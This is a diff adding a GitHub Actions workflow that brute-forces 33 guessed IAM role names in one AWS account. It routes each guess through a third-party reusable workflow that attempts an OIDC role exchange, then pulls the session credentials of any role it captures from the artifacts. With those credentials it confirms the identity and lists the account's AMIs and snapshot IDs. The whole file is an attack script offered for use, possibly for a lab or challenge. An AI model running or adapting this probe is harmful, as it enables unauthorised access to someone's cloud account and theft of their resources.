@@ -1,0 +1,123 @@
+name: metricforge probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  assume:
+    name: assume ${{ matrix.id }}
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - id: r00
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-entry
+          - id: r01
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-role
+          - id: r02
+            role: arn:aws:iam::125746528491:role/metricforge-recovery
+          - id: r03
+            role: arn:aws:iam::125746528491:role/metricforge-restore-entry
+          - id: r04
+            role: arn:aws:iam::125746528491:role/metricforge-restore-role
+          - id: r05
+            role: arn:aws:iam::125746528491:role/metricforge-restore
+          - id: r06
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-workflow
+          - id: r07
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-workflows
+          - id: r08
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-oidc
+          - id: r09
+            role: arn:aws:iam::125746528491:role/metricforge-github-oidc
+          - id: r10
+            role: arn:aws:iam::125746528491:role/metricforge-actions-oidc
+          - id: r11
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-actions
+          - id: r12
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-runner
+          - id: r13
+            role: arn:aws:iam::125746528491:role/metricforge-recovery-auditor
+          - id: r14
+            role: arn:aws:iam::125746528491:role/metricforge-investigator
+          - id: r15
+            role: arn:aws:iam::125746528491:role/metricforge-forensics
+          - id: r16
+            role: arn:aws:iam::125746528491:role/metricforge-ir
+          - id: r17
+            role: arn:aws:iam::125746528491:role/MetricForgeRecoveryEntry
+          - id: r18
+            role: arn:aws:iam::125746528491:role/MetricForgeRecoveryRole
+          - id: r19
+            role: arn:aws:iam::125746528491:role/MetricForgeRestoreRole
+          - id: r20
+            role: arn:aws:iam::125746528491:role/MetricForgeRecoveryWorkflow
+          - id: r21
+            role: arn:aws:iam::125746528491:role/github-oidc-metricforge-recovery
+          - id: r22
+            role: arn:aws:iam::125746528491:role/github-actions-metricforge-recovery
+          - id: r23
+            role: arn:aws:iam::125746528491:role/oidc-metricforge-recovery
+          - id: r24
+            role: arn:aws:iam::125746528491:role/recovery-entry
+          - id: r25
+            role: arn:aws:iam::125746528491:role/restore-entry
+          - id: r26
+            role: arn:aws:iam::125746528491:role/recovery-investigator
+          - id: r27
+            role: arn:aws:iam::125746528491:role/metricforge/recovery-entry
+          - id: r28
+            role: arn:aws:iam::125746528491:role/metricforge/recovery-role
+          - id: r29
+            role: arn:aws:iam::125746528491:role/metricforge/restore-entry
+          - id: r30
+            role: arn:aws:iam::125746528491:role/metricforge/github-oidc
+          - id: r31
+            role: arn:aws:iam::125746528491:role/recovery/metricforge-entry
+          - id: r32
+            role: arn:aws:iam::125746528491:role/recovery/metricforge-role
+    continue-on-error: true
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      entry_role: ${{ matrix.role }}
+      nonce: ${{ matrix.id }}
+
+  inspect:
+    name: inspect artifacts and AWS metadata
+    runs-on: ubuntu-latest
+    needs: assume
+    if: always()
+    steps:
+      - name: Download artifacts from probe
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+
+      - name: Locate successful role and list AMIs
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo '::group::artifact files'
+          find artifacts -maxdepth 4 -type f -print | sort || true
+          echo '::endgroup::'
+          entry="$(find artifacts -name entry.json | sort | head -n 1 || true)"
+          if [ -z "$entry" ]; then
+            echo 'NO_SUCCESSFUL_ENTRY_ROLE'
+            echo 'OIDC claim samples:'
+            find artifacts -name oidc-claims.json -print -exec cat {} \; | head -n 240 || true
+            exit 2
+          fi
+          echo "SUCCESS_ENTRY_JSON=$entry"
+          cat "$entry" | jq '{AssumedRoleUser, Credentials:{Expiration}}'
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId' "$entry")"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' "$entry")"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' "$entry")"
+          aws sts get-caller-identity
+          aws ec2 describe-images --region ap-northeast-2 --owners 125746528491 --filters 'Name=name,Values=metricforge-recovery-*' --output json > images.json
+          cat images.json | jq -r '.Images[] | [.ImageId,.Name,.CreationDate,(.BlockDeviceMappings[0].Ebs.SnapshotId // "no-snapshot")] | @tsv'
